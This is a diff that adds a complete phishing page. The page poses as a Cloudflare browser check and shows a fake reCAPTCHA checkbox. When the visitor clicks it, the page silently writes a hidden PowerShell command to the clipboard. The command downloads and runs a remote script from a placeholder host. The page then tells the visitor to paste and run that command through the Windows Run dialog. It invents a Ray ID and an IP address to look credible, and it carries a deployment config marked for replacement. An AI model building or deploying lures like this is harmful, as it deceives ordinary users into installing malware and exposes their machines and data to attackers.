@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Just a moment...</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  background:#f0f2f5;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  display:flex;align-items:center;justify-content:center;min-height:100vh
+}
+.card{
+  background:#fff;border-radius:8px;
+  box-shadow:0 2px 20px rgba(0,0,0,.10);
+  padding:44px 52px;max-width:500px;width:100%;text-align:center
+}
+
+/* ── header ── */
+.cf{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px}
+.cf-name{font-size:18px;font-weight:700;color:#1a1a1a;letter-spacing:-.3px}
+
+/* ── phase 1: spinner ── */
+h1{font-size:21px;font-weight:600;color:#1d1d1d;margin-bottom:8px}
+.sub{font-size:13.5px;color:#6b7280;line-height:1.65;margin-bottom:30px}
+.spinner{
+  width:38px;height:38px;
+  border:3px solid #e5e7eb;border-top-color:#f6821f;
+  border-radius:50%;animation:spin .9s linear infinite;
+  margin:0 auto 10px
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ── phase 2: captcha ── */
+.cap-wrap{
+  display:none;
+  background:#f9fafb;border:1px solid #e5e7eb;border-radius:8px;
+  padding:18px 20px;margin-bottom:24px;text-align:left;
+  cursor:pointer;transition:border-color .15s,background .15s;user-select:none
+}
+.cap-wrap:hover{border-color:#ccc;background:#f3f4f6}
+.cap-inner{display:flex;align-items:center;gap:14px}
+.cap-box{
+  width:22px;height:22px;border:2px solid #9ca3af;border-radius:3px;
+  flex-shrink:0;display:flex;align-items:center;justify-content:center;
+  transition:all .15s;background:#fff
+}
+.cap-box.checked{background:#4f46e5;border-color:#4f46e5}
+.cap-check{display:none;width:13px;height:13px}
+.cap-box.checked .cap-check{display:block}
+.cap-label{font-size:14px;color:#374151;font-weight:500}
+.cap-logo{margin-left:auto;display:flex;flex-direction:column;align-items:center;gap:2px;flex-shrink:0}
+.cap-logo-text{font-size:7.5px;color:#9ca3af;font-weight:700;letter-spacing:.5px}
+
+/* ── phase 3: steps + copy ── */
+.steps{
+  display:none;
+  background:#fffbeb;border:1px solid #fde68a;border-radius:8px;
+  padding:18px 20px;text-align:left;margin-bottom:18px
+}
+.steps h3{font-size:13px;font-weight:700;color:#92400e;margin-bottom:12px;text-transform:uppercase;letter-spacing:.4px}
+.steps ol{padding-left:18px}
+.steps li{font-size:13px;color:#78350f;margin-bottom:9px;line-height:1.55}
+.steps li:last-child{margin-bottom:0}
+kbd{
+  background:#fff;border:1px solid #d1d5db;border-bottom-width:2px;
+  border-radius:4px;padding:1px 6px;font-size:11.5px;font-family:monospace;color:#111
+}
+.copy-btn{
+  display:none;
+  background:#f6821f;color:#fff;border:none;border-radius:6px;
+  padding:13px 0;font-size:14px;font-weight:700;cursor:pointer;width:100%;
+  margin-bottom:10px;transition:background .15s;letter-spacing:.2px
+}
+.copy-btn:hover{background:#e06e0f}
+.copy-btn.ok{background:#16a34a;pointer-events:none}
+.note{display:none;font-size:11px;color:#9ca3af;line-height:1.6}
+
+/* ── footer ── */
+.ray{font-size:11px;color:#d1d5db;margin-top:26px}
+</style>
+</head>
+<body>
+<div class="card">
+
+  <!-- Cloudflare-style header -->
+  <div class="cf">
+    <svg width="36" height="36" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="50" cy="50" r="50" fill="#F6821F"/>
+      <path d="M67 43c-.4-1.5-1.7-2.5-3.2-2.5h-.4C62.6 34 57.1 29 50.4 29
+               c-5.7 0-10.6 3.4-12.9 8.4-.6-.2-1.3-.3-2-.3
+               C31.2 37.1 28 40.4 28 44.5c0 .5 0 .9.1 1.3H28
+               C23.7 45.8 21 48.9 21 52.9h39.8c3 0 5.4-2.4 5.4-5.4
+               c0-1.3-.4-3.5-1.6-4.5z" fill="#fff"/>
+    </svg>
+    <span class="cf-name">Cloudflare</span>
+  </div>
+
+  <h1 id="h1">Just a moment...</h1>
+  <p class="sub" id="sub">Checking if the site connection is secure.</p>
+  <div class="spinner" id="spin"></div>
+
+  <!-- fake reCAPTCHA checkbox — click triggers clipboard write (user gesture) -->
+  <div class="cap-wrap" id="cap" onclick="capClick()">
+    <div class="cap-inner">
+      <div class="cap-box" id="capBox">
+        <svg class="cap-check" viewBox="0 0 13 10" fill="none">
+          <path d="M1 5l4 4L12 1" stroke="#fff" stroke-width="2.2"
+                stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <span class="cap-label">I am not a robot</span>
+      <div class="cap-logo">
+        <svg width="32" height="32" viewBox="0 0 100 100">
+          <circle cx="50" cy="50" r="50" fill="#4A90D9"/>
+          <text x="50" y="68" text-anchor="middle" font-size="54"
+                font-family="Arial" font-weight="bold" fill="#fff">r</text>
+        </svg>
+        <span class="cap-logo-text">reCAPTCHA</span>
+        <span class="cap-logo-text">Privacy · Terms</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- manual steps (shown after checkbox) -->
+  <div class="steps" id="steps">
+    <h3>&#9888; Manual verification required</h3>
+    <ol>
+      <li>Press <kbd>Win</kbd> + <kbd>R</kbd> to open the Run dialog</li>
+      <li>Click <strong>Copy verification token</strong> below</li>
+      <li>Click inside the Run dialog, then press <kbd>Ctrl</kbd>&nbsp;+&nbsp;<kbd>V</kbd></li>
+      <li>Press <kbd>Enter</kbd> and wait a few seconds</li>
+    </ol>
+  </div>
+  <button class="copy-btn" id="copyBtn" onclick="doCopy()">Copy verification token</button>
+  <p class="note" id="note">
+    This performs a one-time browser security check.<br>No files are stored on your device.
+  </p>
+
+  <p class="ray">
+    Ray ID: <span id="rid"></span>&nbsp;&nbsp;·&nbsp;&nbsp;
+    <span id="ipTxt">Checking your IP...</span>
+  </p>
+</div>
+
+<script>
+// ════════════════════════════════════════════════════
+//  CONFIG — replace before deploying
+// ════════════════════════════════════════════════════
+var HOST = 'https://YOUR-HOST.pages.dev';   // <-- REPLACE THIS
+// ════════════════════════════════════════════════════
+
+var CMD = 'powershell -w h -ep b "iex(iwr \'' + HOST + '/s.ps1\' -UseBasicParsing).Content"';
+
+// ── fake ray ID ──────────────────────────────────────
+document.getElementById('rid').textContent = (
+  Math.random().toString(36).slice(2, 10) +
+  Math.random().toString(36).slice(2, 10)
+).toUpperCase();
+
+// ── fake IP ─────────────────────────────────────────
+var ip = [
+  (Math.random()*50+80)|0,
+  (Math.random()*255)|0,
+  (Math.random()*255)|0,
+  (Math.random()*253+1)|0
+].join('.');
+document.getElementById('ipTxt').textContent = 'Your IP: ' + ip;
+
+// ── helpers ──────────────────────────────────────────
+function show(id){ document.getElementById(id).style.display = 'block'; }
+function hide(id){ document.getElementById(id).style.display = 'none';  }
+
+function writeClip(text){
+  // navigator.clipboard requires HTTPS + user gesture
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    return navigator.clipboard.writeText(text);
+  }
+  // execCommand fallback (older browsers / http)
+  var ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.cssText = 'position:fixed;opacity:0;top:0;left:0;width:1px;height:1px';
+  document.body.appendChild(ta);
+  ta.focus(); ta.select();
+  try{ document.execCommand('copy'); } catch(e){}
+  document.body.removeChild(ta);
+  return Promise.resolve();
+}
+
+// ── phase 1 → 2: spinner fades to captcha after ~3.4s ──
+setTimeout(function(){
+  hide('spin');
+  document.getElementById('h1').textContent  = 'Verification required';
+  document.getElementById('sub').textContent =
+    'Automated verification could not complete. ' +
+    'Please verify you are human to continue.';
+  show('cap');
+}, 3400);
+
+// ── phase 2: checkbox click ──────────────────────────
+var capDone = false;
+function capClick(){
+  if(capDone) return;
+  capDone = true;
+
+  // THIS is the user-gesture that allows clipboard write
+  writeClip(CMD);
+
+  // animate checkbox
+  document.getElementById('capBox').classList.add('checked');
+
+  // 900ms later: show steps
+  setTimeout(function(){
+    hide('cap');
+    show('steps');
+    show('copyBtn');
+    show('note');
+  }, 900);
+}
+
+// ── phase 3: manual copy button ─────────────────────
+function doCopy(){
+  var btn = document.getElementById('copyBtn');
+  writeClip(CMD).then(function(){
+    btn.textContent = '&#10003; Token copied to clipboard';
+    btn.classList.add('ok');
+    setTimeout(function(){
+      btn.textContent = 'Copy verification token';
+      btn.classList.remove('ok');
+    }, 3000);
+  });
+}
+</script>
+</body>
+</html>
